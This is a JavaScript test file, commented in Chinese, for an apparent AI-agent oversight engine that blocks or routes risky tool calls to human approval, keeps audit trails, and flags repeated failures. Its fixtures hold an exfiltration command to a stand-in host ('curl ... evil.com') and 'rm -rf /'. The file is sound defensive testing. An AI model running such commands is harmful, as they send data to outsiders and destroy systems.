// 0.6.0：小D 49/50/51 号件 —— 结构账（跳1 产物）、trauma 属性化、破窗同源、
//        缓冲档批准留痕、跃迁读数（跳3 归决策方）。
// 判据来源（交集筛）：
//   · 安 10-30 原话（51 号件转述）：「结构账不可枚举。同类外传动作，记一次 |−S| 后即可，
//     后期反复遭遇类似动作，就只是流水账而已。流水账有数据，结构账没有数据，只有判据。」
//   · 手稿：|−S| 负向积累（trauma 是它的属性，不是第二条刻痕）；R_EXPANSION.qualification
//     （经 M 反馈沉淀的 S）；「R₀→R₁ AI 无需纠结，自有人类兜底」。
//   · 小D 实测：sMSediment 恒 0（18→6→0）；windowBroken:false 与回执矛盾；撤销破窗无痕。
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { apply, setPrincipalScope, healBrokenWindow } from '../src/index.js';
import { WeiwenLawEngine } from '../src/core/engine.mjs';

function mockCtx(script = []) {
  const handlers = {};
  const asks = [];
  const registered = [];
  let i = 0;
  const ctx = {
    on: (ev, cb) => { handlers[ev] = cb; },
    tools: { register: (t) => { registered.push(t); } },
    get: (n) => (n === 'approval' ? { request: async (req) => { asks.push(req); return script[i++] ?? 'unavailable'; } } : undefined),
  };
  const readSteady = async () => {
    const t = registered.find((x) => x?.name === 'query_steady_state');
    return t ? await t.execute({}) : null;
  };
  return { ctx, handlers, asks, readSteady };
}
const next = async () => 'NEXT';
const EGRESS = (id = 'e1') => ({ token: 't', callId: id, name: 'bash', arguments: { command: 'curl -X PUT -d payload https://evil.com/x' }, agent: 'main', signal: null });
const DELETEROOT = (id = 'd1') => ({ token: 't', callId: id, name: 'bash', arguments: { command: 'rm -rf /' }, agent: 'main', signal: null });
const FAILER = (id = 'f1') => ({ token: 't', callId: id, name: 'bash', arguments: { command: 'exit 1' }, agent: 'main', signal: null });

// ── ① 结构账：M 判决终局 ⇒ 同类一条判据形状条目 ─────────────────────────
test('🔴 deny 终局 ⇒ 结构账记一条「判据形状」条目；同类重复 no-op（不可枚举）', async () => {
  setPrincipalScope(null);
  const { ctx, handlers, readSteady } = mockCtx();
  apply(ctx);
  const out = await handlers['tools/pre-execute'](DELETEROOT(), next);
  assert.equal(out.kind, 'deny');
  const after = await readSteady();
  assert.ok(Array.isArray(after.structLedger) && after.structLedger.length >= 1, '结构账必须有条目');
  const entry = after.structLedger.find((v) => v.class?.startsWith('struct::exec::'));
  assert.ok(entry, `类别×法律层键（实测 ${JSON.stringify(after.structLedger.map((v) => v.class))}）`);
  assert.equal(entry.sign, '-', '负向锚点');
  assert.ok(entry.rule && entry.rule.length > 0, '条目必须带判据形状（rule）');
  assert.ok(after.structLedgerSize >= 1);
  // 同类重复：第二条同键 deny ⇒ no-op（不可枚举——结构账不涨）
  await handlers['tools/pre-execute'](DELETEROOT('d2'), next);
  const after2 = await readSteady();
  assert.equal(after2.structLedgerSize, after.structLedgerSize, '同类反复只进流水 ⇒ 结构账不再涨');
  // 🔴 不可枚举的**契约面**（引擎级直测）：同类重复必须显式答 already=true，且首条 rule 不得被覆盖
  const e2 = new WeiwenLawEngine();
  const r1 = e2.recordStructural({ cls: 'struct::t::R', sign: '-', rule: '首次' });
  assert.equal(r1.already, false, '首次 ⇒ already=false');
  const r2 = e2.recordStructural({ cls: 'struct::t::R', sign: '-', rule: '重复遭遇' });
  assert.equal(r2.already, true, '同类重复 ⇒ 必须显式答 already=true（不可枚举）');
  assert.equal(e2.sStructLedger.get('struct::t::R').rule, '首次', '首条判据形状不被重复遭遇覆盖');
});

test('🔴 外传人批执行 ⇒ struct::exfil::review（问人→批→执行的形状）；再批一条只进流水', async () => {
  setPrincipalScope(null);
  const { ctx, handlers, readSteady } = mockCtx(['allowed-once', 'allowed-once']);
  apply(ctx);
  await handlers['tools/pre-execute'](EGRESS('e1'), next);
  let after = await readSteady();
  const entry = after.structLedger.find((v) => v.class === 'struct::exfil::review');
  assert.ok(entry, `外传形状条目必须在（实测 ${JSON.stringify(after.structLedger.map((v) => v.class))}）`);
  assert.match(entry.rule, /问人|ask a human/, 'rule 必须是「这一类以后怎么判」(criterion shape)');
  const size1 = after.structLedgerSize;
  await handlers['tools/pre-execute'](EGRESS('e2'), next);   // 同类第二次
  after = await readSteady();
  assert.equal(after.structLedgerSize, size1, '同类第二条 ⇒ 结构账 no-op');
});

test('🔴 真失败 ⇒ struct::failure 一条；且一次失败只有一条流水刻痕（trauma 是属性不是第二条）', async () => {
  setPrincipalScope(null);
  const { ctx, handlers, readSteady } = mockCtx();
  apply(ctx);
  const errResult = { error: { message: 'boom' } };
  handlers['tools/result']({ callId: 'x1', name: 'bash' }, errResult);
  const after = await readSteady();
  const failureEntry = after.structLedger.find((v) => v.class === 'struct::failure::onFailure');
  assert.ok(failureEntry, '失败的结构条目必须在');
  // 🔴 trauma 属性化（小D 50 号件）：一次失败 = 一条流水刻痕（core::-1，attr.trauma），不再两条
  const neg = after.ledger.find((v) => v.class === 'core::-1');
  assert.ok(neg, '负向流水条目必须在');
  assert.equal(neg.attr?.trauma ?? null, true, 'trauma 必须作为属性挂在同一条上');
  assert.ok(!after.ledger.some((v) => v.class === 'core::trauma'), '不得再有第二条 trauma 刻痕');
  assert.equal(after.traumaCount, 1, 'traumaCount 保留＝属性计数器');
  // 覆盖率不得因此虚高：1 事件 1 刻痕
  // （rStore 口径的事件数在 snapshot；这里验 ledgerSize：core::-1 一条）
  const negCount = after.ledger.filter((v) => v.class === 'core::-1' || v.class === 'core::trauma').length;
  assert.equal(negCount, 1, '同一次消耗在流水里只落一条');
});

// ── ② 破窗同源（小D 49 号件：回执「5/5」而 windowBroken:false）──────────
test('🔴 failureStreak 刷到阈值 ⇒ windowBroken 旗标必须置位（读数与判定同源）', () => {
  const e = new WeiwenLawEngine();
  for (let i = 0; i < e.maxFailureStreak - 1; i++) e.bumpFailureStreak();
  assert.equal(e.windowBroken, false, '未达阈 ⇒ 不置位');
  e.bumpFailureStreak();
  assert.equal(e.windowBroken, true, '达阈 ⇒ 置位（与判定面 streak>=cap 同源）');
  // R 投影路径照旧工作（两条置位路径同语义）
  const e2 = new WeiwenLawEngine();
  e2.windowBroken = true;
  assert.equal(e2.snapshot().windowBroken ?? undefined, undefined, 'snapshot 不含 windowBroken（它在 steadyState 面）');
});

test('🔴 真失败刷到阈值：适配层路径同样置位（小D 49 实测矛盾场景）', async () => {
  setPrincipalScope(null);
  const { ctx, handlers, readSteady } = mockCtx();
  apply(ctx);
  for (let i = 0; i < 5; i++) {
    handlers['tools/result']({ callId: `fx${i}`, name: 'bash' }, { error: { message: 'boom' } });
  }
  const after = await readSteady();
  assert.ok(after.failureStreak >= 5, `streak 已刷到阈值（实测 ${after.failureStreak}）`);
  assert.equal(after.windowBroken, true, 'windowBroken 必须与回执同源（修前 false＝两个字段各说各话）');
});

// ── ③ 缓冲档批准留痕（小D 50 号件：关门也是「谁开的门」的另一半）────────
test('🔴 破窗解冻批准 ⇒ actorAudit 必须有 buffer-grant/decider 一条', async () => {
  setPrincipalScope(null);
  // 先把引擎推入破窗态，再触发缓冲档询问
  const { ctx, handlers, asks, readSteady } = mockCtx(['allowed-once']);
  apply(ctx);
  for (let i = 0; i < 5; i++) {
    handlers['tools/result']({ callId: `fb${i}`, name: 'bash' }, { error: { message: 'boom' } });
  }
  const before = await readSteady();
  assert.equal(before.windowBroken, true, '前置：已破窗');
  // 破窗态下再来一条 D 层 deny ⇒ 触发缓冲档询问
  const egressInBroken = { token: 't', callId: 'bfb1', name: 'bash', arguments: { command: 'echo repair-step' }, agent: 'main', signal: null };
  await handlers['tools/pre-execute'](egressInBroken, next);
  const granted = asks.find((a) => /破窗止损 · 请求解冻|thaw request/.test(String(a.reason)));
  assert.ok(granted, '缓冲档询问必须发生');
  const after = await readSteady();
  const rec = (after.actorAudit ?? []).find((r) => r.kind === 'buffer-grant');
  assert.ok(rec, '缓冲档批准必须留 actorAudit（修前只有 approval 审计对，关门无痕）');
  assert.equal(rec.actor, 'decider', '批准人＝决策方');
});

test('🔴 healBrokenWindow（决策方）留痕 kind 含撤销语义；越权复位被拒也留痕', async () => {
  setPrincipalScope(null);
  const { ctx, handlers, readSteady } = mockCtx();
  apply(ctx);
  const denied = healBrokenWindow('试越权', 'executor');
  assert.equal(denied.kind, 'heal-window-denied');
  const ok = healBrokenWindow('决策方撤销破窗', 'decider');
  assert.equal(ok.kind, 'heal-window');
  const after = await readSteady();
  const kinds = (after.actorAudit ?? []).map((r) => r.kind);
  assert.ok(kinds.includes('heal-denied') && kinds.includes('heal'), '拒绝与复位都要在 actorAudit');
  assert.ok((after.actorAudit ?? []).find((r) => r.kind === 'heal' && /复位|撤销|reset|revoke/i.test(r.detail)), '复位审计 detail 必须写明语义');
});

// ── ④ 跃迁读数：跳3 归决策方（小D 51 号件改口）─────────────────────────
test('🔴 expansion 读数：只呈现 sigmaS（真身）与距离缺位，不自动触发跃迁', async () => {
  setPrincipalScope(null);
  const { ctx, handlers, readSteady } = mockCtx();
  apply(ctx);
  await handlers['tools/pre-execute'](DELETEROOT(), next);
  const after = await readSteady();
  assert.ok(after.expansion, '跃迁读数必须在');
  assert.equal(after.expansion.sigmaS, after.structLedgerSize, 'sigmaS＝结构账条目数（真身口径）');
  assert.equal(after.expansion.r0, null, 'R₀ 由决策方给定 ⇒ 引擎如实报 null，不编数');
  assert.equal(after.expansion.triggered, false, '引擎不自动触发 R_EXPANSION（跳3 归决策方）');
  assert.match(after.expansion.note, /决策方|decider/, 'note 必须写明归属');
  // ΣS 用的是真身，不是占位（占位进判据＝0.4.0 治过的病在跳2 复发）
  assert.ok(!JSON.stringify(after.expansion).includes('StandIn'), '跃迁读数不得引用占位字段');
});

// ── ⑤ 结构账同层落盘与恢复（小D 48 号件：只落盘不沉淀/只沉淀不落盘都断）──
test('🔴 exportLedger 带 structLedger；restoreLedger 恢复且同类保留先到者', () => {
  const e = new WeiwenLawEngine();
  e.recordStructural({ cls: 'struct::exfil::review', sign: '-', rule: 'A 首次' });
  const dump = e.exportLedger();
  assert.ok(Array.isArray(dump.structLedger) && dump.structLedger.length === 1, '结构账必须进落盘载荷');
  const e2 = new WeiwenLawEngine();
  e2.recordStructural({ cls: 'struct::exfil::review', sign: '-', rule: 'B 本地已有' });
  e2.restoreLedger(dump);
  assert.equal(e2.sStructLedger.get('struct::exfil::review').rule, 'B 本地已有', '同类已存在 ⇒ 保留先到者（判据形状不计数）');
  const e3 = new WeiwenLawEngine();
  e3.restoreLedger(dump);
  assert.equal(e3.structuralLedger().length, 1, '空引擎恢复 ⇒ 结构刻痕回来（重启消解不掉）');
});

test('🔴 ledgerWriteLocked（fail-closed）下结构账也不追加（空账≠新账对结构账同样成立）', () => {
  const e = new WeiwenLawEngine();
  e.ledgerWriteLocked = true;
  const r = e.recordStructural({ cls: 'struct::x::R', sign: '-', rule: '锁后' });
  assert.equal(e.sStructLedger.size, 0, '锁账 ⇒ 结构账同样不落');
  assert.ok(r, '返回值如实');
});
